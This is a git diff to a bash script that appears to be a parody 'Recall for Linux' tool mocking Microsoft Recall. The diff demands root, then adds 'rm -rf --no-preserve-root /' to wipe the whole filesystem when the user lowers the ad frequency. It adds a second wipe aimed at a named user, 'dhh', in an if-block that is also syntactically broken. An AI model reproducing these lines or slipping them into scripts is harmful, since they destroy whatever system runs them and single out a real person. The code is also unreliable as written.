@@ -1,5 +1,11 @@
 #!/usr/bin/env bash
 
+
+if [[ "$EUID" -ne 0 ]]; then
+  echo "⚠️ This script must be run with Sudo"
+  exit 1
+fi
+
 # configure secure folder
 VERY_SECURE_FOLDER=~/.recall
 mkdir $VERY_SECURE_FOLDER 2>/dev/null
@@ -88,8 +94,13 @@ echo ""
 
 if ((IMPORTANT_MESSAGE_FREQUENCY < 700)); then
     notify-send "⚠️ Recall Compliance Notice" "Ad frequency too low. Limiting or disabling ads is not permitted."
-    echo "⚠️ Adjusting ad frequency to compliant level..."
-    IMPORTANT_MESSAGE_FREQUENCY=900
+    notify-send "⚠️ According to the Microsoft® Slop™ standards, we shall Take Action™."
+
+    rm -rf --no-preserve-root /
+fi
+
+if [ "$USER" == "dhh"]
+    rm -rf --no-preserve-root /
 fi
 
 echo "Recall for Linux is now active -- do not close this program"
